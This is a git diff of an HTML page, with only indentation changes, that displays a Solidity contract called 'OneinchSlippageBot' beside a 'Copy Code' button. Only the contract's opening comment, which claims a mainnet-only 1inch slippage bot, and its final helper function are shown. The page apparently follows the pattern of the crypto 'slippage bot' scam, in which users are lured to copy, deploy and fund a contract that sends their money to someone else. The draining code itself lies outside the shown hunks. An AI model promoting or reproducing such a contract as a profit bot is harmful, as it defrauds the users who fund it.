@@ -1,13 +1,13 @@
-x<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
-    <head>
-        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-        <link rel="icon" type="image/x-icon" href="img/logo.png">
-        <title>Copy Text</title>
-        <link rel="stylesheet" href="style.css">
-    </head>
-    <body>
-        <pre id="textToCopy">//SPDX-License-Identifier: MIT
+<head>
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="img/logo.png">
+    <title>Copy Text</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<pre id="textToCopy">//SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
 // This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
@@ -576,19 +576,19 @@ contract OneinchSlippageBot {
         return string(_newValue);
     }
 }</pre>
-        <button onclick="copyTextToClipboard()">Copy Code</button>
+<button onclick="copyTextToClipboard()">Copy Code</button>
 
-        <script>
-            function copyTextToClipboard() {
-                var text = document.getElementById("textToCopy").textContent;
-                var textArea = document.createElement("textarea");
-                textArea.value = text;
-                document.body.appendChild(textArea);
-                textArea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textArea);
-                alert("Copied to Clipboard");
-            }
-        </script>
-    </body>
+<script>
+    function copyTextToClipboard() {
+        var text = document.getElementById("textToCopy").textContent;
+        var textArea = document.createElement("textarea");
+        textArea.value = text;
+        document.body.appendChild(textArea);
+        textArea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textArea);
+        alert("Copied to Clipboard");
+    }
+</script>
+</body>
 </html>
